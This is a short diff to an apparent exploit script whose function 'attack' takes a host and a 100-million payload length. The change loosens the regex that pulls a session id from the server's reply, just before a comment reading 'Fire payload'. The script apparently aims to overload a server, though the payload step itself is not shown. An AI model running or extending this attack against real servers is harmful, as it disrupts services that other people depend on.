@@ -28,7 +28,7 @@ def attack(host, payload_length=100000000):
     # Create session
     response = requests.get(base_url + timestr()).text
     print("Response from server", repr(response))
-    sid = re.search("\"sid\":\"([a-f0-9]+)\"", response).group(1)
+    sid = re.search("\"sid\":\"([^\"]+)\"", response).group(1)
     print("Got session", sid)
     session_url = base_url + "&sid=" + sid
     # Fire payload
